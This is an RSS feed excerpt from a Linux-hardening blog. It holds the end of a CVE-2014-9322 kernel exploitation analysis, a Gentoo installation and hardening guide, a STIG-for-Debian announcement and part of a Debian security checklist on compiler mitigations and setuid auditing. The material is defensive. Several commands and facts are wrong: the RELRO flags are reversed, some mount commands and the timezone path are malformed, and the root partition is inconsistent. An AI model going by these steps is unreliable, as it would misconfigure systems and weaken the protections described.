&lt;p&gt;最近的CPU有wrgsbase指令可以直接设置gs base，这是一个非特权级指令，但需
要通过内核设置CR4控制寄存器中的FSGSBASE bit( no 16)来开启。Linux并没有
设置这个位，因此用户空间不能使用这条指令。&lt;/p&gt;

&lt;p&gt;在64位系统上，非系统级的GDT和LDT条目依然是8个字节长，base field是最大
4GB-1，所以根本没有机会设置一个基地址的段在内核空间里。所以，除非我漏掉
了能在内核里设置用户态gs base的其他方法，不然SMAP能保护CVE-2014-9322针
对64位Linux内核任意代码执行的漏洞利用。&lt;/p&gt;

&lt;p&gt;[1] CVE-2014-9322 
    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9322&lt;/p&gt;

&lt;p&gt;[2] Upstream fix
    http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=6f442be2fb22be02cafa606f1769fa1e6f894441&lt;/p&gt;

&lt;p&gt;[3] Intel Software Developer’s Manuals,
    http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html&lt;/p&gt;

&lt;p&gt;[4] SMEP
    http://vulnfactory.org/blog/2011/06/05/smep-what-is-it-and-how-to-beat-it-on-linux/&lt;/p&gt;

&lt;p&gt;[5] SMAP
    http://lwn.net/Articles/517475&lt;/p&gt;

&lt;p&gt;[6] “pretend-it-was-#GP-in-userspace”
    https://lists.debian.org/debian-kernel/2014/12/msg00083.html&lt;/p&gt;

&lt;p&gt;[7] Stack Pivoting
    https://trailofbits.files.wordpress.com/2010/04/practical-rop.pdf&lt;/p&gt;

&lt;p&gt;[8] TSX improves timing attacks against KASLR
    http://labs.bromium.com/2014/10/27/tsx-improves-timing-attacks-against-kaslr/&lt;/p&gt;
</description>
        <pubDate>Sun, 05 Jul 2015 22:46:39 +0800</pubDate>
        <link>http://www.hardenedlinux.org/jekyll/update/2015/07/05/badiret-analysis.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/jekyll/update/2015/07/05/badiret-analysis.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>Gentoo GNU/Linux系统安装与加固</title>
        <description>&lt;p&gt;By: Ciphergateway&lt;/p&gt;

&lt;p&gt;–[  目录&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;准备工作&lt;/li&gt;
  &lt;li&gt;组建RAID1&lt;/li&gt;
  &lt;li&gt;安装Gentoo系统
3.1 livecd下配置安装环境
3.2 Gentoo安装及编译
3.3 软件环境安装&lt;/li&gt;
  &lt;li&gt;Gentoo内核加固
4.1 加固选项设置
4.2 编译gentoo hardened内核&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;section&quot;&gt;–[ 1、准备工作&lt;/h2&gt;

&lt;p&gt;用U盘启动引导安装gentoo系统，将gentoo系统的镜像文件livedvd-amd64-multilib-20140826.iso拷贝到已经格式化过的格式为fat32的U盘中；&lt;/p&gt;

&lt;p&gt;U盘镜像下载链接：&lt;a href=&quot;http://mirrors.se.kernel.org/gentoo//releases/amd64/20140826/livedvd-amd64-multilib-20140826.iso&quot; title=&quot;下载链接&quot;&gt;http://mirrors.se.kernel.org/gentoo//releases/amd64/20140826/livedvd-amd64-multilib-20140826.iso&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;raid1&quot;&gt;–[ 2、组建RAID1&lt;/h2&gt;

&lt;p&gt;1）Advanced Mode–&amp;gt;高级–&amp;gt;cpu设置，将Intel虚拟技术设为开启；&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/ljVLrxi.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2）Advanced Mode–&amp;gt;高级–&amp;gt;PCH存储设置，将SATA模式选择为RAID；&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/K6rDKtM.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;3）保存设置并重启，按Ctrl+I(分别按不是同时按)，进入RAID配置界面，将两块3T机械硬盘组建为RAID1;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/XjgyVIQ.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;gentoo&quot;&gt;–[ 3、安装Gentoo系统&lt;/h2&gt;

&lt;h3 id=&quot;livecd&quot;&gt;—-[ 3.1 livecd下配置安装环境&lt;/h3&gt;

&lt;p&gt;1）服务器上插入U盘，配置root账户，开启sshd服务:
　
&lt;img src=&quot;http://i.imgur.com/LUPazv2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2）使用gentoo livecd中自带的分区工具gdisk为系统分区，机械盘分两区，固态盘分五区(实际使用过程中使用cfdisk，gparted也可，我使用给gdisk的原因是这次在对raid盘进行分区时使用gparted造成了gpt与mbr分区表同时存在的问题，使用cfdisk将整个分区识别为了一个名为gpt的主分区)，以下是两块硬盘的分区结果：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/LytBlwM.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/pJ1S2K2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;3）利用secureCRT登陆系统shell(链接前先要确认主机的ip，并确保两个主机处于同一网段，如果只有一台电脑，也可以在该主机上直接操作)：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/y5eo8Qh.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;4）制作文件系统(格式化分区，默认格式成了ext4分区，如有需要，也可以格式成其他格式的分区)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    mkfs.ext4 /dev/sda3
    mkfs.ext4 /dev/sda4
    mkfs.ext4 /dev/sda5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/6x8T18i.jpg&quot; alt=&quot;&quot; /&gt;
设置swap分区&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    mkswap /dev/sda2 ![](http://i.imgur.com/FX6HKRi.png) 格式化其他分区
    mkfs.fat /dev/sda1
    mkfs.ext4 /dev/md126p1
    mkfs.ext4 /dev/md126p2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/wVi2cPS.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;5）挂载分区（将两块硬盘以目录树的形式挂载在/mnt）(分区用途/dev/sda1 efi分区，才用mbr引导的可忽略此份区，/dev/sda3 tmp分区，/den/sda4 根分区，/dev/sda5 home分区)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; mount /dev/sda4/mnt/gentoo
 mkdir -p/mnt/gentoo/boot/efi
 mount /dev/sda1/mnt/gentoo/boot/efi
 mount -p/mnt/gentoo/home
 mount /dev/sda5/mnt/gentoo/home
 mkdir /mnt/gentoo/tmp
 mount /dev/sda3/mnt/gentoo/tmp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6）设置系统时间(注意 日期格式为MMddhhmmyyyy)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;date 061915262015
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;7）下载系统编译包portage-latest.tar.bz2和stage3-amd64-20150618.tar.bz2到/mnt/gentoo目录下(注意，镜像源我们选择的是阿里云的镜像，使用者可自行更换，下载stage3包时要选择日期最近的)：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;wget http://mirrors.aliyun.com/gentoo/releases/snapshots/current/portage-latest.tar.bz2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/1YOrwhV.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt; wget http://mirrors.ustc.edu.cn/gentoo/releases/amd64/autobuilds/current-stage3-amd64/stage3-amd64-20150618.tar.bz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/gNpBpCX.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;8）解压stage3和portage两个文件：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar -jxvf stage3-amd64-20150618.tar.bz2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注: stage3-amd64-20131010.tar.bz2解压的文件是Gentoo的目录结构，所以要解压到临时的系统目录下,即/mnt/gentoo，方便后面进行chroot&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar -jxvf portage-latest.tar.bz2 -C /mnt/gentoo/usr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注: portage-latest.tar.bz2解压的文件为系统软件目录结构,需要解压到/mnt/gentoo/usr目录下&lt;/p&gt;

&lt;h3 id=&quot;gentoo-1&quot;&gt;—-[ 3.2 Gentoo安装及编译&lt;/h3&gt;

&lt;p&gt;1）切换系统到/dev/sda3根分区上并更新系统环境变量：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mount -t proc none /mnt/gentoo/proc
mount -o bind /dev /mnt/gentoo/dev
mount -t sysfs sys /mnt/gentoo/sys
chroot /mnt/gentoo /bin/bash
env-update
&amp;gt;&amp;gt; Regenerating /etc/ld.so.cache...
source /etc/profile
export PS1=&quot;(chroot) $PS1&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2）设置时区：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cp /usr/share/Asia/Shanghai /etc/localtime
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3）设置主机名：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sed -i -e's/hostname.*/hostname=&quot;shenhua&quot;/' /etc/conf.d/hostname
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4）修改镜像源 并且设置编译参数为8核编译(注意，编译参数在设置为核心数加1时理论上也可获得最优效果)：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/9452UEB.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;5）设置DNS(通常情况下设置默认dns即可，但此步缺失会造成dns无法解析，原因为chroot过程中dns信息未被转移)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;echo &quot;nameserver 10.1.2.1&quot; &amp;gt;&amp;gt; /etc/resolv.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6）安装内核源码：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge gentoo-sources
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;7）安装自动编译内核工具genkernel：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge genkernel
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;8）复制安装光盘的配置文件到genkernel搜索配置文件的默认位置(注意32位用户目录为/usr/share/arch/x8/,此配置文件livecd所使用的配置文件)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;zcat /proc/config.gz &amp;gt; /usr/share/arch/x86_64/kernel-config
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;9）编译内核：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; genkernel all
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;10）修改fstab：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/Olr6tbb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;11）配置网络：&lt;/p&gt;

&lt;p&gt;　（1）生成软连接(注意，eno1为网络接口名，不同电脑可能不同，请在chroot前用ifconfig命令确认)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   ln -s /etc/init.d/net.lo /etc/init.d/net.eno1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;　（2）创建网络配置文件：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; vi /etc/conf.d/net
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;　在空文件中写入(注意，如果是静态ip请采用静态配置)：
     # DHCP
     config_eno1=( “dhcp” )&lt;/p&gt;

&lt;p&gt;12）设置网卡开机自启动：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rc-update add net.eno1 default
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;13）设置GRUB引导：&lt;/p&gt;

&lt;p&gt;(1) 修改配置文件：在etc/portage/make.conf中添加GRUB_PLATFORMS=”efi-64”(mbr引导可忽略此步骤)&lt;/p&gt;

&lt;p&gt;(2) 安装GRUB&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge --ask sys-boot/grub:2
emerge -av sys-boot/os-prober
grub2-install --target=x86_64-efi
grub2-mkconfig -o /boot/grub2/grub.cfg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(3) 重起电脑，确认grub引导是否安装成功，如果成功再进行一下步骤&lt;/p&gt;

&lt;h3 id=&quot;section-1&quot;&gt;—-[ 3.3 软件环境安装&lt;/h3&gt;

&lt;p&gt;1）安装xrog：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; 在 /etc/portage/make.conf 中添加 INPUT_DEVICES=&quot;evdev synaptics&quot; 
 emerge --ask --verbose --pretend x11-base/xorg-drivers
 emerge --ask x11-base/xorg-server
 cat /etc/portage/package.use/._cfg0000_iputils &amp;gt; /etc/portage/package.use/iputils
 emerge twm
 emerge xclock
 emerge xterm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;　　备注：twm xclock xterm原本是xrog软件包的一部分，在版本更新后从xrog中分离出来 需要单独安装&lt;/p&gt;

&lt;p&gt;2）编译kde桌面环境 
　　备注：编译其他环境 请参照wiki.gentoo.org openrc启动的kde对应的编号是6 其他桌面环境请自行更换&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;eselect profile list
eselect profile set 6
emerge --ask kde-apps/kdebase-meta
emerge --ask kde-base/kde4-l10n
在/etc/portage/make.conf中添加 LINGUAS=&quot;de&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;gentoo-2&quot;&gt;–[  4、Gentoo内核加固&lt;/h2&gt;

&lt;h3 id=&quot;section-2&quot;&gt;—-[ 4.1　加固选项设置&lt;/h3&gt;

&lt;p&gt;　　编辑/etc/ssh/ssh_config文件，在里面加入：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	# 1, known_hosts stores server's signature, so hash the host name:	
	HashKnownHosts yes
	#2, SSH protocl version 1 is not secure:
	Protocol 2
	#3, If you don't use X11 forwarding, plz disable it&quot;
	X11Forwarding no
	#4, Disable rhosts:
	IgnoreRhosts yes
	#5, Not allow empty password:
	PermitEmptyPasswords no
	#6, Maxisum tries:
	MaxAuthTries 5
	#7, Now allow root login:
	PermitRootLogin no
	#(Optional)
	#1, disable password auth, enable pubkey auth:
	PubkeyAuthentication yes
	PasswordAuthentication no
	#2，Allow or deny users/groups
	#AllowGroups, AllowUsers, DenyUsers, DenyGroups
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;　　根据自己的实际要求在改写最后一行 改为自己的用户组合用户名&lt;/p&gt;

&lt;h3 id=&quot;gentoo-hardened&quot;&gt;—-[ 4.2　编译gentoo hardened内核&lt;/h3&gt;

&lt;p&gt;1）下载加固内核源码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge --ask sys-kernel/hardened-sources
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2）配置加固内核 参照：&lt;/p&gt;

&lt;p&gt;　　&lt;a href=&quot;https://wiki.gentoo.org/wiki/Hardened/PaX_Quickstart#Building_a_PaX_Kernel&quot;&gt;https://wiki.gentoo.org/wiki/Hardened/PaX_Quickstart#Building_a_PaX_Kernel&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;　　&lt;a href=&quot;https://wiki.gentoo.org/wiki/Hardened/Grsecurity2_Quickstart&quot;&gt;https://wiki.gentoo.org/wiki/Hardened/Grsecurity2_Quickstart&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3）编译&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ make
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4）安装&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# make install
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;5）选择内核&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# eselect kernel list
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6）重启使用新内核即可&lt;/p&gt;

</description>
        <pubDate>Tue, 23 Jun 2015 00:00:00 +0800</pubDate>
        <link>http://www.hardenedlinux.org/ciphergateway/update/2015/06/23/Gentoo_system_install&kernal_harden.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/ciphergateway/update/2015/06/23/Gentoo_system_install&kernal_harden.html</guid>
        
        
        <category>ciphergateway</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>STIG-4-Debian</title>
        <description>&lt;p&gt;By:n3o4po11o&lt;/p&gt;

&lt;p&gt;Project: &lt;a href=&quot;https://github.com/hardenedlinux/STIG-4-Debian&quot;&gt;STIG-4-Debian&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;why-stig&quot;&gt;Why STIG?&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://iase.disa.mil/stigs/Pages/index.aspx&quot;&gt;STIGs&lt;/a&gt; is bring by a government agency called The Defense Information
System Agency(DISA), which is entity responsible for maintaining the security
posture of the Department of Defence(DoD) IT infrastructure. After we heard 
how the NSA fuck this world from Mr.Sn0wd3n.We will pay more attention about
how &lt;em&gt;they&lt;/em&gt; do the defense.&lt;/p&gt;

&lt;p&gt;DoD use this Security Technical Implementation Guides to All DoD IT assets before online/operations.&lt;/p&gt;

&lt;p&gt;And the STIGs classification system based on Mission Assurance Catagory (I-III)
and Confidentiality Level (Public-Classified), giving you 9 different possible 
combinations of config requirements.&lt;/p&gt;

&lt;h2 id=&quot;why-debian&quot;&gt;Why Debian?&lt;/h2&gt;

&lt;p&gt;In this scripts I’ve on Debian GNU/Linux 8, Debian has a lot security mechanism, and 
some good features, especially “ReproducibleBuilds”. I use the STIG for Red hat
6 v1r7 to porting STIG for Debian 8.&lt;/p&gt;

&lt;p&gt;Debian always has active maintenance, and has good security in default-configuration&lt;/p&gt;

&lt;h2 id=&quot;whats-different&quot;&gt;What’s different?&lt;/h2&gt;

&lt;p&gt;In STIG for RHEL-06, there’s some service doesn’t exist in debian, or some command or
some purpose implement in different way.&lt;/p&gt;

&lt;p&gt;You could find the porting-log in the repo &lt;a href=&quot;https://github.com/hardenedlinux/STIG-4-Debian&quot;&gt;STIG-4-Debian&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;But the general idea are all based on &lt;a href=&quot;http://iasecontent.disa.mil/stigs/zip/Apr2015/U_RedHat_6_V1R7_STIG.zip&quot;&gt;STIG For RHEL-06 v1r7&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;todo&quot;&gt;TODO&lt;/h2&gt;

&lt;p&gt;There’s a lot of TODO &lt;br /&gt;
Because this version I release just a simple “POC”, and just a pre-release version.
It doesn’t even cover all the “check”&lt;/p&gt;

&lt;p&gt;But I will release the first version of “full-check” version soon, and add Classification 
and Severity right after full-check, I think it will release in next month.&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;[1]Difference between hardening guides (CIS, NSA, DISA)
http://security.stackexchange.com/questions/73164/difference-between-hardening-guides-cis-nsa-disa&lt;/p&gt;

&lt;p&gt;[2]What Are “STIGs” and How Do They Impact Your Overall Security Program?
http://www.seguetech.com/blog/2013/05/06/stigs-impact-overall-security-program&lt;/p&gt;

&lt;p&gt;[3]Beyond compliance: DISA STIGs’ role in cybersecurity
http://gcn.com/Articles/2015/05/14/DISA-STIG-compliance.aspx?Page=1&lt;/p&gt;

&lt;p&gt;[4]Security Technical Implementation Guides (STIGs)
http://iase.disa.mil/stigs/Pages/index.aspx&lt;/p&gt;

&lt;p&gt;[5]DISA RHEL 6 STIG V1 R7
http://iasecontent.disa.mil/stigs/zip/Apr2015/U_RedHat_6_V1R7_STIG.zip&lt;/p&gt;

&lt;p&gt;[6]Defense Information Systems Agency
https://en.wikipedia.org/wiki/Defense_Information_Systems_Agency&lt;/p&gt;

&lt;p&gt;[7]ReproducibleBuilds
https://wiki.debian.org/ReproducibleBuilds&lt;/p&gt;
</description>
        <pubDate>Fri, 19 Jun 2015 11:38:39 +0800</pubDate>
        <link>http://www.hardenedlinux.org/jekyll/update/2015/06/19/STIG-4-Debian.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/jekyll/update/2015/06/19/STIG-4-Debian.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>Debian GNU/Linux security checklist and hardening</title>
        <description>&lt;p&gt;project STIG-4-Debian will be soonn….&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/citypw/DNFWAH/master/5/d5_0x02_DNFWAH_debian_gnu-linux_security_chklist_hardening.txt&quot;&gt;Debian GNU/Linux security checklist and hardening&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;–[ CONTENTS&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;About this doc&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security updates&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Vulnerability Assessment&lt;/p&gt;

    &lt;p&gt;2.1 GCC mitigation&lt;/p&gt;

    &lt;p&gt;2.2 0ld sch00l *nix file auditing&lt;/p&gt;

    &lt;p&gt;2.3 GNU/Linux’s auditd&lt;/p&gt;

    &lt;p&gt;2.4 T00ls&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Kernel security&lt;/p&gt;

    &lt;p&gt;3.1 Apparmor&lt;/p&gt;

    &lt;p&gt;3.2 SELinux&lt;/p&gt;

    &lt;p&gt;3.3 Mempo kernel&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt;3.3.1 PaX\/Grsecurity
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;SSL/TLS Checklist&lt;/p&gt;

    &lt;p&gt;4.1 Ciphersuites in Apache2/Nginx&lt;/p&gt;

    &lt;p&gt;4.2 OpenSSH&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt;4.2.1 OpenSSH in post-prism era
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Web security&lt;/p&gt;

    &lt;p&gt;5.1 Web server( Apache/Nginx?)&lt;/p&gt;

    &lt;p&gt;5.2 WAF( Web Application Firewall)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security standard&lt;/p&gt;

    &lt;p&gt;6.1 STIGs for Debian&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Reference&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;about-this-documentation&quot;&gt;–[ 0. About this documentation&lt;/h2&gt;

&lt;p&gt;GNU/Linux already become one of most important fundamental element in
*modern* IT platform. Almost every important applications heavily rely
on the core component of GNU system: GCC, Glibc and linux
kernel. GNU/Linux is totally free/libre and open source software(
FLOSS). Many people thinks free/libre and open source software is
secure because its open to many eyes. Yes, that’s true. According to
&lt;a href=&quot;http://developers.slashdot.org/story/14/04/16/2021227/code-quality-open-source-vs-proprietary&quot;&gt;Coverity’s report&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The source code quality of FLOSS project are better than closed
software systems. But the FLOSS is not unbreakable. This documentation
is going to discuss something we should know about GNU/Linux security
operations. These examples in this doc has been tested only on Debian
GNU/Linux 7.5.&lt;/p&gt;

&lt;h2 id=&quot;security-update&quot;&gt;–[ 1. Security update&lt;/h2&gt;

&lt;p&gt;Follow the minimal installation principle: Debian is providing mini
installation iso.&lt;/p&gt;

&lt;p&gt;To check which packages need security updates:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;#sudo apt-get upgrade -s&lt;/td&gt;
      &lt;td&gt;grep -i security&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;vulnerability-assessment&quot;&gt;–[ 2. Vulnerability Assessment&lt;/h2&gt;

&lt;p&gt;Know your GNU/Linux system as your *enemy* does. Your enmey might hide
in the shadow and watch and learn the ways you’ve been using the
system. As a defender, some philosophical ideas( thanks to Bruce
Schneier) should be &lt;a href=&quot;https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html&quot;&gt;kept in mind&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;Security is NOT:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Security is NOT installing a firewall&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security is NOT a Product or Service&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security is Not a Product; It’s a Process&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Security is:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Security is a Process, Methodology, Costs, Policies and People&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security is only as good as your “weakest link”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security is 24x7x365 … constantly ongoing .. never ending&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;p&gt;A security system is only as strong as its weakest
link. Defense-in-depth seems the only option we have. You should be
the best professional paranoia and also need a proper threat
model. “Who’s gonna attack your system” would be daily bread for your
mind;-)&lt;/p&gt;

&lt;p&gt;Those two articles are good examples of assessing GNU/Linux distros: &lt;a href=&quot;https://labs.mwrinfosecurity.com/blog/2010/06/29/assessing-the-tux-strength-part-1---userspace-memory-protection/&quot;&gt;Assessing I&lt;/a&gt;, &lt;a href=&quot;https://labs.mwrinfosecurity.com/blog/2010/09/02/assessing-the-tux-strength-part-2---into-the-kernel/&quot;&gt;Assessing II&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;“checksec.sh” is very useful tool from trapkit:&lt;/p&gt;
&lt;pre&gt;
#wget http://www.trapkit.de/tools/checksec.sh
&lt;/pre&gt;

&lt;p&gt;Be very careful with those binaries, which has suid( or sgid?) bit:&lt;/p&gt;
&lt;pre&gt;
#!/bin/bash

SETUID_PROGS=`find / -type f -perm -4000`

echo $SETUID_PROGS

for i in $SETUID_PROGS; do
        ./checksec.sh --file $i
done
&lt;/pre&gt;

&lt;h3 id=&quot;gcc-mitigation&quot;&gt;—-[ 2.1 GCC mitigation&lt;/h3&gt;

&lt;p&gt;setuid binaries are highly risks if the program had the bug that can
be exploitable.  The setuid binaries should be protected under GCC’s
mitigation.  We only examine &lt;a href=&quot;http://phrack.org/archives/issues/67/13.txt&quot;&gt;4 mitigation options here&lt;/a&gt; ( some GCC mitigation
description from one Phrack paper, thanks pi3..dude, did I owe you a
beer?)&lt;/p&gt;

&lt;p&gt;*) NX&lt;/p&gt;

&lt;p&gt;This feature can prevent shellcode execution on the stack.  This
mechanism can be implemented by hardware or software emulation.&lt;/p&gt;

&lt;p&gt;In GCC’s options, &lt;a href=&quot;http://en.wikipedia.org/wiki/NX_bit&quot;&gt;NX&lt;/a&gt; is enable by default. If you want to turn it off,
use “-z execstack”.&lt;/p&gt;

&lt;p&gt;Check method:&lt;/p&gt;
&lt;pre&gt;
shawn@shawn-fortress ~ $ readelf -l a.out | grep GNU_STACK 
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x8
&lt;/pre&gt;

&lt;p&gt;*) Stack canaries (canaries of the death)&lt;/p&gt;

&lt;p&gt;This is a compiler mechanism, in contrast to previously kernel-based
described techniques. When a function is called, the code inserted by
the compiler in its prologue stores a special value (the so-called
cookie) on the stack before the metadata. This value is a kind of
defender of sensitive data. During the epilogue the stack value is
compared with the original one and if they are not the same then a
memory corruption must have occurred. The program is then killed and
this situation is reported in the system logs. Details about technical
implementation and little arm race between protection and bypassing
protection in this area will be explained further.&lt;/p&gt;

&lt;p&gt;GCC options:
-fno-stack-protector,  do not add any canary onto any functions&lt;/p&gt;

&lt;p&gt;-fstack-protector, only add the canary onto a few functions in compile
 time&lt;/p&gt;

&lt;p&gt;-fstack-protector-all , add the canary onto all functions, be cautions
 about this one. It’d be triggered the heavily performance hit.&lt;/p&gt;

&lt;p&gt;-fstack-protector-strong, add the canary onto those functions, which
 the stack buffers would be used. This is a smart one. But its only
 supported by GCC 4.9.x. Kees Cook shared a very &lt;a href=&quot;http://www.outflux.net/blog/archives/2014/01/27/fstack-protector-strong/&quot;&gt;good writing here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Check the symbols in an elf file:&lt;/p&gt;
&lt;pre&gt;
#readelf -s ./a.out | grep stack_chk_fail 
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@GLIBC_2.4 (3) 
    52: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@@GLIBC_2 
&lt;/pre&gt;

&lt;p&gt;*) RELRO&lt;/p&gt;

&lt;p&gt;RELocation Read-Only.&lt;/p&gt;

&lt;p&gt;Turn it on: -z norelro 
Turn it off: -z now&lt;/p&gt;

&lt;p&gt;Check elf header to find partial-RELRO:&lt;/p&gt;
